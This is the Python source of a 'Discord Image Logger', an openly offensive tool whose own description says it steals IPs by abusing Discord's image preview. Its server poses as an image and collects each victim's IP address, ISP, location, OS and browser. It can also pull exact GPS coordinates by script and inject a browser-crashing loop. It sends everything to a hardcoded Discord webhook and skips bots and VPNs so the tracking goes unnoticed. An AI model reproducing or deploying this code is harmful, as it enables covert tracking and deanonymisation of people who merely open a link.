# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1128369802919022643/dtq1gzq0blV7WgC8hzGdPOz7aIm1ElybyE54E__1e6tcZggTmLVibXD_UHJ-MzGSpwGr",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
